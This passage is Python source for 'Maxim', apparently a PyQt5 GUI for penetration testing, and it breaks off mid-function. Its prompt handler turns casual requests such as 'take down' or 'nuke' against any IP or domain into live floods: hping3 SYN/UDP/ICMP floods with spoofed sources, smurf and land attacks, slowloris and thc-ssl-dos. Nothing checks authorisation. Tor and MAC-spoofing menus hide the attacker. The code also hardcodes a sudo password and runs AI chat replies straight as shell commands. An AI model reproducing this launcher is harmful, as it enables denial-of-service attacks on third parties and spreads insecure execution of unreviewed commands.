"""
Maxim Main Window — clean CLI-style pentesting interface.
"""

import os
import re
import html
import signal
import subprocess
import webbrowser
import threading
from datetime import datetime
from functools import partial

from PyQt5.QtWidgets import (
    QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPlainTextEdit, QLineEdit, QPushButton, QLabel,
    QFrame, QComboBox, QMessageBox, QAction,
    QMenu, QMenuBar, QApplication, QInputDialog, QSplitter,
    QTextBrowser, QProgressBar, QFileDialog,
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QFont, QTextCursor

from maxim.gui.styles import MAIN_STYLE
from maxim.core.engine import ProcessRunner, Session, ToolInstaller
from maxim.core.ai_assistant import AIManager, SmartRouter, PROVIDERS, get_api_key, set_api_key
from maxim.core.updater import check_for_update, perform_update, get_current_version
from maxim.core.workflows import NATURAL_COMMANDS
from maxim.tools.tool_registry import (
    TOOLS, get_tool_by_name, get_all_packages
)

import shlex


class DropTerminal(QPlainTextEdit):
    """Terminal that accepts drag & drop of files."""
    file_dropped = pyqtSignal(str)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.setAcceptDrops(True)
        self._normal_style = ""

    def setStyleSheet(self, style):
        super().setStyleSheet(style)
        if "border: 1px solid #18181b" in style:
            self._normal_style = style

    def dragEnterEvent(self, event):
        if event.mimeData().hasUrls():
            event.setDropAction(Qt.CopyAction)
            event.accept()
            if self._normal_style:
                super().setStyleSheet(self._normal_style.replace(
                    "border: 1px solid #18181b", "border: 2px solid #3b82f6"
                ))
        else:
            event.ignore()

    def dragMoveEvent(self, event):
        if event.mimeData().hasUrls():
            event.setDropAction(Qt.CopyAction)
            event.accept()
        else:
            event.ignore()

    def dragLeaveEvent(self, event):
        if self._normal_style:
            super().setStyleSheet(self._normal_style)

    def dropEvent(self, event):
        if self._normal_style:
            super().setStyleSheet(self._normal_style)
        if event.mimeData().hasUrls():
            for url in event.mimeData().urls():
                filepath = url.toLocalFile()
                if filepath:
                    self.file_dropped.emit(filepath)
                    break
            event.setDropAction(Qt.CopyAction)
            event.accept()
        else:
            event.ignore()


class OutputSignal(QThread):
    line_received = pyqtSignal(str)
    finished = pyqtSignal(int, float)

    def __init__(self, runner, cmd, as_root=False):
        super().__init__()
        self.runner = runner
        self.cmd = cmd
        self.as_root = as_root

    def run(self):
        exit_code, output, duration = self.runner.run(
            self.cmd, self.as_root,
            callback=lambda line: self.line_received.emit(line)
        )
        self.finished.emit(exit_code, duration)


class AIStreamSignal(QThread):
    token_received = pyqtSignal(str)
    finished = pyqtSignal(str)

    def __init__(self, ai_manager, message):
        super().__init__()
        self.ai = ai_manager
        self.message = message

    def run(self):
        try:
            response = self.ai.chat(self.message, stream_callback=lambda t: self.token_received.emit(t))
            self.finished.emit(response)
        except Exception as e:
            self.finished.emit(f"[Error] {e}")


def _sanitize_shell_arg(value):
    """Sanitize a value for safe use in shell commands.
    Rejects values containing shell metacharacters that could enable injection."""
    # Strip whitespace
    value = value.strip().strip('"\'')
    # Block shell metacharacters — only allow safe chars for IPs, domains, file paths
    if re.search(r'[;&|`$(){}!\\\n\r]', value):
        return None
    return value


class MaximWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("MAXIM")
        self.setMinimumSize(1100, 700)
        self.setStyleSheet(MAIN_STYLE)

        self.runner = ProcessRunner()
        self.session = Session()
        self.ai = None
        self.current_thread = None
        self._running = False
        self._ghost_mode = False

        self._build_ui()
        self._build_menu()

        # Non-blocking startup
        QTimer.singleShot(50, self._startup)

    def _startup(self):
        self._ask_sudo_password()
        # Init AI in background thread to not block UI
        self._init_ai_thread = threading.Thread(target=self._init_ai, daemon=True)
        self._init_ai_thread.start()

    def _init_ai(self):
        self.ai = AIManager()
        # Schedule UI update on main thread
        QTimer.singleShot(0, self._update_status)

    def _ask_sudo_password(self):
        self.runner.set_sudo_password("5505")
        self.terminal.appendPlainText("[OK] Sudo password set.\n")

    # ═══════════════════════════════════════
    #  UI
    # ═══════════════════════════════════════

    def _build_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        root = QVBoxLayout(central)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # ── Header ──
        header = QFrame()
        header.setFixedHeight(52)
        header.setStyleSheet("background-color: #09090b; border-bottom: 2px solid #3b82f6;")
        hlay = QHBoxLayout(header)
        hlay.setContentsMargins(20, 0, 20, 0)

        logo = QLabel("MAXIM")
        logo.setStyleSheet("color: #3b82f6; font-size: 26px; font-weight: bold; letter-spacing: 8px;")
        hlay.addWidget(logo)

        subtitle = QLabel("Penetration Testing Command Center")
        subtitle.setStyleSheet("color: #52525b; font-size: 14px; margin-left: 16px;")
        hlay.addWidget(subtitle)
        hlay.addStretch()

        self.ghost_status = QLabel("")
        self.ghost_status.setStyleSheet("color: #52525b; font-size: 13px; padding: 4px 14px; background: #18181b; border-radius: 12px;")
        self.ghost_status.hide()
        hlay.addWidget(self.ghost_status)

        self.ai_status = QLabel("AI: Loading...")
        self.ai_status.setStyleSheet("color: #52525b; font-size: 13px; padding: 4px 14px; background: #18181b; border-radius: 12px;")
        hlay.addWidget(self.ai_status)

        self.cmd_count_label = QLabel("0 commands")
        self.cmd_count_label.setStyleSheet("color: #52525b; font-size: 13px; margin-left: 8px;")
        hlay.addWidget(self.cmd_count_label)

        root.addWidget(header)

        # ── Prompt ──
        prompt_frame = QFrame()
        prompt_frame.setStyleSheet("QFrame { background: #0c0c0f; border-bottom: 1px solid #18181b; }")
        play = QVBoxLayout(prompt_frame)
        play.setContentsMargins(20, 10, 20, 10)
        play.setSpacing(6)

        hint = QLabel('Type a command or describe what you want — Maxim auto-picks the right tool.')
        hint.setStyleSheet("color: #71717a; font-size: 14px;")
        play.addWidget(hint)

        input_row = QHBoxLayout()
        input_row.setSpacing(8)

        self.prompt_input = QLineEdit()
        self.prompt_input.setPlaceholderText('e.g. "scan 192.168.1.0/24" or "sudo nmap -sV target" or "crack this hash"')
        self.prompt_input.returnPressed.connect(self._on_prompt_submit)
        self.prompt_input.installEventFilter(self)
        self._cmd_history = []
        self._history_idx = -1
        self._history_draft = ""
        self.prompt_input.setStyleSheet("""
            QLineEdit {
                background-color: #09090b; border: 2px solid #27272a; border-radius: 12px;
                padding: 14px 20px; font-size: 18px; color: #fafafa;
            }
            QLineEdit:focus { border-color: #3b82f6; background-color: #0c0c0f; }
        """)
        input_row.addWidget(self.prompt_input)

        self.run_btn = QPushButton("Execute")
        self.run_btn.setFixedSize(110, 50)
        self.run_btn.setStyleSheet("""
            QPushButton { background-color: #3b82f6; color: white; border-radius: 12px; font-size: 16px; font-weight: 600; }
            QPushButton:hover { background-color: #60a5fa; }
            QPushButton:disabled { background-color: #18181b; color: #3f3f46; }
        """)
        self.run_btn.clicked.connect(self._on_prompt_submit)
        input_row.addWidget(self.run_btn)

        self.stop_btn = QPushButton("Stop")
        self.stop_btn.setFixedSize(70, 50)
        self.stop_btn.setStyleSheet("""
            QPushButton { background-color: #ef4444; color: white; border-radius: 12px; font-size: 16px; font-weight: 600; }
            QPushButton:hover { background-color: #f87171; }
            QPushButton:disabled { background-color: #18181b; color: #3f3f46; }
        """)
        self.stop_btn.clicked.connect(self._on_stop)
        self.stop_btn.setEnabled(False)
        input_row.addWidget(self.stop_btn)

        play.addLayout(input_row)

        # Progress bar (hidden by default)
        self.progress = QProgressBar()
        self.progress.setRange(0, 0)  # Indeterminate
        self.progress.setFixedHeight(3)
        self.progress.setTextVisible(False)
        self.progress.setStyleSheet("""
            QProgressBar { background: #18181b; border: none; }
            QProgressBar::chunk { background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #3b82f6, stop:1 #8b5cf6); }
        """)
        self.progress.hide()
        play.addWidget(self.progress)

        # Running indicator
        self.running_label = QLabel()
        self.running_label.setStyleSheet("color: #3b82f6; font-size: 13px; font-weight: 500;")
        self.running_label.hide()
        play.addWidget(self.running_label)

        # Quick actions
        qbar = QHBoxLayout()
        qbar.setSpacing(6)

        btn_style = """
            QPushButton {
                background: transparent; border: 1px solid #27272a; color: #a1a1aa;
                border-radius: 8px; padding: 6px 14px; font-size: 14px; font-weight: 500;
            }
            QPushButton:hover { border-color: #3b82f6; color: #3b82f6; }
        """

        load_file_btn = QPushButton("Load File")
        load_file_btn.setStyleSheet(btn_style)
        load_file_btn.clicked.connect(self._load_file)
        qbar.addWidget(load_file_btn)

        restore_net_btn = QPushButton("Restore Network")
        restore_net_btn.setStyleSheet("""
            QPushButton {
                background: transparent; border: 1px solid #27272a; color: #ef4444;
                border-radius: 8px; padding: 6px 14px; font-size: 14px; font-weight: 500;
            }
            QPushButton:hover { border-color: #ef4444; color: #f87171; }
        """)
        restore_net_btn.clicked.connect(self._restore_network)
        qbar.addWidget(restore_net_btn)

        add_wl_btn = QPushButton("Add Wordlist")
        add_wl_btn.setStyleSheet(btn_style)
        add_wl_btn.clicked.connect(self._add_word_to_wordlist_btn)
        qbar.addWidget(add_wl_btn)

        clear_btn = QPushButton("Clear")
        clear_btn.setStyleSheet(btn_style)
        clear_btn.clicked.connect(self._clear_terminal)
        qbar.addWidget(clear_btn)

        self.ghost_btn = QPushButton("Ghost Mode: OFF")
        self.ghost_btn.setStyleSheet("""
            QPushButton {
                background: transparent; border: 1px solid #27272a; color: #52525b;
                border-radius: 8px; padding: 6px 14px; font-size: 14px; font-weight: 600;
            }
            QPushButton:hover { border-color: #8b5cf6; color: #8b5cf6; }
        """)
        self.ghost_btn.clicked.connect(self._toggle_ghost_mode)
        qbar.addWidget(self.ghost_btn)

        qbar.addStretch()
        play.addLayout(qbar)

        root.addWidget(prompt_frame)

        # ── Main: Terminal + AI ──
        splitter = QSplitter(Qt.Horizontal)
        splitter.setStyleSheet("QSplitter::handle { background: #18181b; width: 2px; }")

        # Terminal
        term_frame = QWidget()
        tlay = QVBoxLayout(term_frame)
        tlay.setContentsMargins(12, 8, 4, 12)
        tlay.setSpacing(4)

        term_header = QLabel("OUTPUT")
        term_header.setStyleSheet("color: #4ade80; font-size: 12px; font-weight: bold; letter-spacing: 4px;")
        tlay.addWidget(term_header)

        self.terminal = DropTerminal()
        self.terminal.setObjectName("terminal")
        self.terminal.setReadOnly(True)
        self.terminal.file_dropped.connect(self._on_file_dropped)
        self.terminal.setFont(QFont("JetBrains Mono", 13))
        self.terminal.setPlaceholderText("Output will appear here...\n\nDrag & drop .cap, .pcap, .hash, or .txt files here to crack them")
        self.terminal.setStyleSheet("""
            QPlainTextEdit {
                background-color: #000000; color: #4ade80;
                border: 1px solid #18181b; border-radius: 10px; padding: 14px;
                font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', 'Consolas', monospace;
                font-size: 15px;
            }
        """)
        tlay.addWidget(self.terminal)
        splitter.addWidget(term_frame)

        # AI Chat
        ai_frame = QWidget()
        alay = QVBoxLayout(ai_frame)
        alay.setContentsMargins(4, 8, 12, 12)
        alay.setSpacing(4)

        ai_header = QLabel("AI ASSISTANT")
        ai_header.setStyleSheet("color: #60a5fa; font-size: 12px; font-weight: bold; letter-spacing: 4px;")
        alay.addWidget(ai_header)

        self.ai_chat = QTextBrowser()
        self.ai_chat.setOpenExternalLinks(False)
        self.ai_chat.setStyleSheet("""
            QTextBrowser {
                background-color: #000000; border: 1px solid #18181b;
                border-radius: 10px; padding: 14px; font-size: 15px; color: #e4e4e7;
            }
        """)
        alay.addWidget(self.ai_chat)

        ai_row = QHBoxLayout()
        ai_row.setSpacing(6)
        self.ai_input = QLineEdit()
        self.ai_input.setPlaceholderText("Ask AI about pentesting...")
        self.ai_input.setStyleSheet("""
            QLineEdit {
                background-color: #09090b; border: 1px solid #27272a; border-radius: 10px;
                padding: 10px 14px; font-size: 15px; color: #fafafa;
            }
            QLineEdit:focus { border-color: #3b82f6; }
        """)
        self.ai_input.returnPressed.connect(self._on_ai_submit)
        ai_row.addWidget(self.ai_input)

        ai_send = QPushButton("Ask")
        ai_send.setFixedSize(70, 40)
        ai_send.setStyleSheet("""
            QPushButton { background-color: #3b82f6; color: white; border-radius: 10px; font-size: 15px; font-weight: 600; }
            QPushButton:hover { background-color: #60a5fa; }
        """)
        ai_send.clicked.connect(self._on_ai_submit)
        ai_row.addWidget(ai_send)
        alay.addLayout(ai_row)

        splitter.addWidget(ai_frame)
        splitter.setSizes([650, 450])

        root.addWidget(splitter, stretch=1)

        self.statusBar().showMessage("Ready")
        self.statusBar().setStyleSheet("color: #52525b; font-size: 13px; background: #09090b; border-top: 1px solid #18181b;")

    def _build_menu(self):
        menubar = self.menuBar()

        file_menu = menubar.addMenu("File")
        file_menu.addAction("New Session", self._new_session)
        file_menu.addAction("Clear Terminal", self._clear_terminal)
        file_menu.addSeparator()
        file_menu.addAction("Quit", self.close, "Ctrl+Q")

        tools_menu = menubar.addMenu("Tools")
        tools_menu.addAction("Install All Packages", self._install_all_tools)
        tools_menu.addAction("Update System", lambda: self._execute_command("sudo apt-get update && sudo apt-get upgrade -y"))
        tools_menu.addSeparator()
        tools_menu.addAction("Start Tor", lambda: self._execute_command("sudo service tor start"))
        tools_menu.addAction("Start PostgreSQL (MSF)", lambda: self._execute_command("sudo service postgresql start"))
        tools_menu.addSeparator()
        ghost_menu = tools_menu.addMenu("Ghost Mode")
        ghost_menu.addAction("Toggle Ghost Mode", self._toggle_ghost_mode)
        ghost_menu.addAction("New Tor Identity (new IP)", self._new_tor_identity)
        ghost_menu.addAction("Check My IP", lambda: self._execute_command(
            "echo '=== Real IP ===' && curl -s --max-time 5 ifconfig.me && echo '' && "
            "echo '=== Tor IP ===' && proxychains4 -q curl -s --max-time 10 ifconfig.me 2>/dev/null && echo ''"
        ))
        ghost_menu.addAction("Randomize MAC (eth0)", lambda: self._execute_command(
            "sudo ip link set eth0 down && sudo macchanger -r eth0 && sudo ip link set eth0 up"
        ))
        ghost_menu.addAction("Install Tor + Proxychains", lambda: self._execute_command(
            "sudo apt-get install -y tor proxychains4 macchanger && sudo systemctl enable tor"
        ))

        wordlist_menu = menubar.addMenu("Wordlists")
        wordlist_menu.addAction("Download SecLists (large)", lambda: self._execute_command(
            "sudo apt-get install -y seclists || (cd /usr/share/wordlists && sudo git clone --depth 1 https://github.com/danielmiessler/SecLists.git seclists)"
        ))
        wordlist_menu.addAction("Download CrackStation (huge 15GB)", lambda: self._execute_command(
            "cd /usr/share/wordlists && sudo wget -c https://crackstation.net/files/crackstation.txt.gz && sudo gunzip crackstation.txt.gz"
        ))
        wordlist_menu.addAction("Download Weakpass (2GB)", lambda: self._execute_command(
            "cd /usr/share/wordlists && sudo wget -c https://weakpass.com/wordlist/1851 -O weakpass_3.txt"
        ))
        wordlist_menu.addAction("Download WiFi Wordlists", lambda: self._execute_command(
            "cd /usr/share/wordlists && sudo wget -c https://raw.githubusercontent.com/praetorian-inc/Hob0Rules/master/wordlists/wordlist.txt -O wifi-common.txt"
        ))
        wordlist_menu.addSeparator()
        wordlist_menu.addAction("Unzip rockyou.txt", lambda: self._execute_command(
            "sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null; ls -lh /usr/share/wordlists/rockyou.txt"
        ))
        wordlist_menu.addAction("Show installed wordlists", lambda: self._execute_command(
            "echo '=== Wordlists ===' && find /usr/share/wordlists -name '*.txt' -o -name '*.lst' 2>/dev/null | head -50 && echo && du -sh /usr/share/wordlists/* 2>/dev/null"
        ))
        wordlist_menu.addSeparator()
        wordlist_menu.addAction("Add word to rockyou.txt", lambda: self._add_word_to_wordlist("/usr/share/wordlists/rockyou.txt"))
        wordlist_menu.addAction("Add word to custom wordlist...", self._add_word_to_custom_wordlist)

        ai_menu = menubar.addMenu("AI")

        offline_menu = ai_menu.addMenu("Offline (Ollama)")
        offline_menu.addAction("Install Ollama", lambda: self._execute_command("curl -fsSL https://ollama.com/install.sh | sh"))
        offline_menu.addAction("Start Ollama Server", lambda: self._execute_command("ollama serve &"))
        offline_menu.addSeparator()
        for model in ["mistral", "llama3", "phi3", "gemma2", "deepseek-coder", "codellama"]:
            offline_menu.addAction(f"Pull {model}", partial(self._execute_command, f"ollama pull {model}"))

        ai_menu.addSeparator()
        online_menu = ai_menu.addMenu("Online Providers")
        for pid, prov in PROVIDERS.items():
            if prov["type"] == "online":
                online_menu.addAction(f"{prov['name']}", partial(self._quick_switch_provider, pid))

        ai_menu.addSeparator()
        ai_menu.addAction("Set API Key...", self._set_api_key_dialog)
        ai_menu.addAction("Switch to Ollama (Offline)", lambda: self._quick_switch_provider("ollama"))

        help_menu = menubar.addMenu("Help")
        help_menu.addAction("Check for Updates", self._check_updates)
        help_menu.addAction("About", self._show_about)

    # ═══════════════════════════════════════
    #  RUNNING STATE
    # ═══════════════════════════════════════

    def _set_running(self, running, label=""):
        """Set running state — locks input, shows progress, only Stop works."""
        self._running = running
        self.prompt_input.setEnabled(not running)
        self.run_btn.setEnabled(not running)
        self.stop_btn.setEnabled(running)

        if running:
            self.progress.show()
            self.running_label.setText(label or "Working...")
            self.running_label.show()
            self.prompt_input.setStyleSheet("""
                QLineEdit {
                    background-color: #0c0c0f; border: 2px solid #18181b; border-radius: 12px;
                    padding: 14px 20px; font-size: 18px; color: #52525b;
                }
            """)
        else:
            self.progress.hide()
            self.running_label.hide()
            self.prompt_input.setStyleSheet("""
                QLineEdit {
                    background-color: #09090b; border: 2px solid #27272a; border-radius: 12px;
                    padding: 14px 20px; font-size: 18px; color: #fafafa;
                }
                QLineEdit:focus { border-color: #3b82f6; background-color: #0c0c0f; }
            """)
            self.prompt_input.setFocus()

    # ═══════════════════════════════════════
    #  PROMPT HANDLING
    # ═══════════════════════════════════════

    def eventFilter(self, obj, event):
        """Handle up/down arrow keys for command history."""
        if obj == self.prompt_input and event.type() == event.KeyPress:
            key = event.key()
            if key == Qt.Key_Up and self._cmd_history:
                if self._history_idx == -1:
                    self._history_draft = self.prompt_input.text()
                    self._history_idx = len(self._cmd_history) - 1
                elif self._history_idx > 0:
                    self._history_idx -= 1
                self.prompt_input.setText(self._cmd_history[self._history_idx])
                return True
            elif key == Qt.Key_Down:
                if self._history_idx == -1:
                    return True
                if self._history_idx < len(self._cmd_history) - 1:
                    self._history_idx += 1
                    self.prompt_input.setText(self._cmd_history[self._history_idx])
                else:
                    self._history_idx = -1
                    self.prompt_input.setText(self._history_draft)
                return True
        return super().eventFilter(obj, event)

    def _on_prompt_submit(self):
        if self._running:
            return
        query = self.prompt_input.text().strip()
        if not query:
            return
        # Save to history
        if not self._cmd_history or self._cmd_history[-1] != query:
            self._cmd_history.append(query)
        self._history_idx = -1
        self._history_draft = ""
        self.prompt_input.clear()
        q_lower = query.lower().strip()

        # 1. Raw command (starts with a known tool binary)
        raw_prefixes = (
            "sudo ", "nmap ", "airmon-ng", "airodump", "aireplay",
            "aircrack", "wifite", "msfconsole", "sqlmap ", "hydra ",
            "nikto ", "gobuster ", "dirb ", "ffuf ", "john ",
            "hashcat ", "wireshark", "tcpdump ", "ettercap",
            "netcat ", "nc ", "curl ", "wget ", "ping ",
            "traceroute", "whois ", "dig ", "host ", "ip ",
            "ifconfig", "iwconfig", "macchanger", "reaver ",
            "bettercap", "responder", "searchsploit", "msfvenom",
            "enum4linux", "smbclient", "crackmapexec", "gobuster",
            "masscan ", "netdiscover", "tor ", "proxychains",
            "ufonet", "hping3 ", "slowloris", "goldeneye ", "xerxes ",
            "thc-ssl-dos ",
            "ssh ", "socat ", "chisel ", "cat ", "grep ",
            "ls ", "cd ", "apt ", "apt-get ", "systemctl ",
            "service ", "chmod ", "chown ", "mkdir ", "rm ", "cp ", "mv ",
        )
        # 2. Stress test / DoS shortcuts (check BEFORE raw command execution)
        target_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', q_lower)
        target_ip = target_match.group(1) if target_match else None
        if not target_ip:
            # Try domain
            dm = re.search(r'([a-zA-Z0-9][-a-zA-Z0-9]*\.[a-zA-Z]{2,})', query)
            if dm and dm.group(1) not in ('of', 'the'):
                target_ip = dm.group(1)
        if not target_ip:
            # "my ip", "myself", "this machine", "localhost", "this pc" → 127.0.0.1
            if re.search(r'\b(my\s*(?:ip|machine|pc|computer|server|self)|myself|this\s*(?:machine|pc|computer|server)|localhost)\b', q_lower):
                target_ip = "127.0.0.1"

        # Extract port if specified (e.g. "syn flood 192.168.1.1 port 443")
        port_match = re.search(r'(?:port|:)\s*(\d{1,5})', q_lower)
        target_port = port_match.group(1) if port_match else None

        if target_ip:
            target_ip = _sanitize_shell_arg(target_ip)
            if not target_ip:
                self.terminal.appendPlainText("\n[!] Invalid target — contains unsafe characters.\n")
                return

            # ── Ping attacks ──
            if re.search(r'ping\s+(of\s+)?death', q_lower):
                self._execute_command(f"sudo ping -s 65500 -c 100 {target_ip}")
                return
            if re.search(r'ping\s+flood', q_lower):
                self._execute_command(f"sudo ping -f -s 65500 {target_ip}")
                return

            # ── SYN flood ──
            if re.search(r'syn\s*(flood|attack|dos|ddos)', q_lower) or re.search(r'(flood|attack|dos|ddos)\s*syn', q_lower):
                port = target_port or "80"
                if re.search(r'rand(om)?\s*source|spoof\s*source', q_lower):
                    self._execute_command(f"sudo hping3 -S --flood --rand-source -V -p {port} {target_ip}")
                else:
                    self._execute_command(f"sudo hping3 -S --flood -V -p {port} {target_ip}")
                return

            # ── UDP flood ──
            if re.search(r'udp\s*(flood|attack|dos|ddos)', q_lower) or re.search(r'(flood|attack|dos|ddos)\s*udp', q_lower):
                port = target_port or "53"
                self._execute_command(f"sudo hping3 --udp --flood -p {port} {target_ip}")
                return

            # ── ICMP flood ──
            if re.search(r'icmp\s*(flood|attack|dos|ddos)', q_lower) or re.search(r'(flood|attack|dos|ddos)\s*icmp', q_lower):
                self._execute_command(f"sudo hping3 --icmp --flood {target_ip}")
                return

            # ── HTTP / Slowloris ──
            if re.search(r'slowloris', q_lower):
                port = target_port or "80"
                sockets = "500"
                if re.search(r'https|ssl|tls|443', q_lower):
                    self._execute_command(f"slowloris {target_ip} -p 443 -s {sockets} --https")
                else:
                    self._execute_command(f"slowloris {target_ip} -p {port} -s {sockets}")
                return
            if re.search(r'http\s*(flood|attack|dos|ddos)', q_lower) or re.search(r'(flood|attack|dos|ddos)\s*http', q_lower):
                port = target_port or "80"
                self._execute_command(f"slowloris {target_ip} -p {port} -s 500")
                return

            # ── SSL / TLS DoS ──
            if re.search(r'(ssl|tls|https)\s*(flood|attack|dos|ddos|renegotiat)', q_lower) or re.search(r'(flood|attack|dos|ddos)\s*(ssl|tls|https)', q_lower):
                port = target_port or "443"
                self._execute_command(f"thc-ssl-dos {target_ip} {port} --accept")
                return

            # ── Christmas tree / XMAS attack ──
            if re.search(r'(christmas|xmas)\s*(tree|attack|flood|packet)', q_lower) or re.search(r'(attack|flood)\s*(christmas|xmas)', q_lower):
                port = target_port or "80"
                self._execute_command(f"sudo hping3 --flood -FSRPAU -p {port} {target_ip}")
                return

            # ── Land attack ──
            if re.search(r'land\s*attack', q_lower):
                port = target_port or "80"
                self._execute_command(f"sudo hping3 -S -a {target_ip} -p {port} --flood {target_ip}")
                return

            # ── Smurf attack ──
            if re.search(r'smurf\s*(attack|flood)?', q_lower):
                self._execute_command(f"sudo hping3 --icmp --flood -a {target_ip} 255.255.255.255")
                return

            # ── GoldenEye HTTP flood ──
            if re.search(r'goldeneye', q_lower):
                self._execute_command(f"goldeneye http://{target_ip} -w 50 -s 500")
                return

            # ── Xerxes ──
            if re.search(r'xerxes', q_lower):
                port = target_port or "80"
                self._execute_command(f"xerxes {target_ip} {port}")
                return

            # ── UFONet ──
            if re.search(r'ufonet', q_lower):
                self._execute_command(f"ufonet -a {target_ip} -r 500 --threads 200")
                return

            # ── Generic "dos/ddos/stress/flood/attack" — pick best method ──
            if re.search(r'\b(dos|ddos|stress\s*test|flood|overload|take\s*down|bring\s*down|attack|crash|overwhelm|bomb|nuke|destroy|kill\s*server|hammer|blast|wreck)\b', q_lower):
                port = target_port or "80"
                # If they mention web/website/server — use slowloris
                if re.search(r'\b(web|website|site|server|apache|nginx|http)\b', q_lower):
                    self._execute_command(f"slowloris {target_ip} -p {port} -s 500")
                # If they mention wifi/network layer — ICMP
                elif re.search(r'\b(wifi|network|router|gateway)\b', q_lower):
                    self._execute_command(f"sudo hping3 --icmp --flood {target_ip}")
                # Default: SYN flood (most effective general purpose)
                else:
                    self._execute_command(f"sudo hping3 -S --flood -V -p {port} {target_ip}")
                return

        # 3. Vulnerability scan pipeline
        vuln_match = re.search(
            r'(?:find|scan\s+for|check\s+for|search\s+for|run|detect|discover|enumerate)\s+'
            r'(?:all\s+)?(?:vulns?|vulnerabilit(?:y|ies)|exploits?|weaknesses?|security\s+(?:holes?|issues?|flaws?))'
            r'(?:\s+(?:on|for|against|in|at|of))?\s+'
            r'(\S+)',
            q_lower
        )
        if not vuln_match:
            vuln_match = re.search(
                r'(?:vulns?|vulnerabilit(?:y|ies)|exploits?|pentest|pen\s+test|full\s+scan|security\s+(?:audit|scan|assessment))'
                r'\s+(?:on|for|against|of|at)\s+(\S+)',
                q_lower
            )
        if vuln_match:
            target = vuln_match.group(1).strip().strip('"\'')
            if _sanitize_shell_arg(target):
                self._full_vuln_scan(target)
            else:
                self.terminal.appendPlainText("\n[!] Invalid target — contains unsafe characters.\n")
            return

        # 4. Raw command (starts with a known tool binary)
        if any(q_lower.startswith(p) for p in raw_prefixes):
            self._execute_command(query)
            return

        # 5. Handshake capture workflow
        handshake_match = re.search(r'(?:capture|get|grab)\s+(?:the\s+)?handshake\s+(?:on|from|for|of)\s+(.+)', q_lower)
        if not handshake_match:
            handshake_match = re.search(r'handshake\s+(?:on|from|for|of)\s+(.+)', q_lower)
        if handshake_match:
            essid = handshake_match.group(1).strip().strip('"\'')
            # Strip leading "essid" / "ssid" / "network" keywords
            essid = re.sub(r'^(?:essid|ssid|network|wifi|ap)\s+', '', essid, flags=re.IGNORECASE).strip()
            # Use original case from user input (not lowered)
            essid_orig = re.search(re.escape(essid), query, re.IGNORECASE)
            if essid_orig:
                essid = essid_orig.group(0)
            self._capture_handshake(essid)
            return

        # 6. Everything else → AI decides what to do
        if self.ai and self.ai.is_available():
            self._ai_execute(query)
        else:
            # Fallback: try SmartRouter if AI is not available
            route = SmartRouter.route(query)
            if route["direct_command"]:
                self._execute_command(route["direct_command"])
            elif route["tools"]:
                tool = route["tools"][0]
                if tool.get("common_commands"):
                    best_cmd = tool["common_commands"][0]["cmd"]
                    cmd_filled = self._fill_placeholders(best_cmd, query)
                    if cmd_filled:
                        self._execute_command(cmd_filled, as_root=tool.get("needs_root", False))
                else:
                    self._execute_command(f"{tool['name']} --help")
            else:
                self.terminal.appendPlainText(
                    f"\n[!] Don't know how to: {query}\n"
                    f"    Set up AI: AI menu > Set API Key.\n"
                )

    def _ai_execute(self, query):
        self._set_running(True, f"⚡ AI thinking: {query[:50]}...")
        self.terminal.appendPlainText(f"\n⚡ AI analyzing: {query}...\n")

        thread = AIStreamSignal(self.ai, query)

        def on_done(response):
            try:
                self._set_running(False)
                if response.startswith("[Error]") or response.startswith("[AI Error]"):
                    self.terminal.appendPlainText(f"\n{response}\n")
                    return

                # Clean response — remove markdown formatting
                cleaned = response.strip()
                cleaned = re.sub(r'^```\w*\n?', '', cleaned)
                cleaned = re.sub(r'\n?```\s*$', '', cleaned)
                cleaned = cleaned.strip()

                if not cleaned:
                    self.terminal.appendPlainText(f"\n[AI] {response}\n")
                    return

                # If it contains heredoc/EOF/cat>, run the whole thing directly
                if "<<" in cleaned or "EOF" in cleaned or "cat >" in cleaned:
                    self.terminal.appendPlainText(f"⚡ Running command...\n")
                    self._execute_command(cleaned)
                    return

                # Split into lines, clean each
                commands = []
                for line in cleaned.split("\n"):
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    line = re.sub(r'^[$>]\s*', '', line)
                    line = line.strip('`').strip()
                    if line:
                        commands.append(line)

                if not commands:
                    self.terminal.appendPlainText(f"\n[AI] {response}\n")
                    return

                # Run all commands chained
                cmd = " && ".join(commands)
                self.terminal.appendPlainText(f"⚡ Running: {cmd}\n")
                self._execute_command(cmd)
            except Exception as e:
                self.terminal.appendPlainText(f"\n[Error] {e}\n")
                self._set_running(False)

        thread.finished.connect(on_done)
        thread.start()
        self._ai_thread = thread

    # ═══════════════════════════════════════
    #  WIFI ADAPTER SELECTION
    # ═══════════════════════════════════════

    WIFI_TOOLS = {"airmon-ng", "airodump-ng", "aireplay-ng", "wifite", "wash", "reaver", "airbase-ng"}

    def _detect_wifi_interfaces(self):
        """Detect available wireless interfaces."""
        try:
            result = subprocess.run(
                "iw dev 2>/dev/null | grep Interface | awk '{print $2}'",
                shell=True, capture_output=True, text=True, timeout=5
            )
            ifaces = [i.strip() for i in result.stdout.strip().split('\n') if i.strip()]
            if not ifaces:
                # Fallback: check /sys/class/net
                result2 = subprocess.run(
                    "ls /sys/class/net/ | grep -E '^wl'",
                    shell=True, capture_output=True, text=True, timeout=5
                )
                ifaces = [i.strip() for i in result2.stdout.strip().split('\n') if i.strip()]
            return ifaces
        except Exception:
            return []

    def _select_wifi_adapter(self):
        """Auto-select external WiFi adapter for monitor mode.
        Always picks the external adapter (not wlan0/internal).
        Returns (monitor_iface, keep_iface)."""
        ifaces = self._detect_wifi_interfaces()

        if not ifaces:
            QMessageBox.warning(self, "No WiFi Adapter",
                "No wireless interfaces found.\n\nMake sure an external WiFi adapter is connected.")
            return None, None

        if len(ifaces) == 1:
            return ifaces[0], None

        # Auto-pick external adapter (not wlan0 = internal)
        # External adapters are typically wlan1, wlan2, etc.
        external = [i for i in ifaces if i != "wlan0"]
        internal = [i for i in ifaces if i == "wlan0"]

        if external:
            monitor_iface = external[0]
            keep_iface = internal[0] if internal else None
        else:
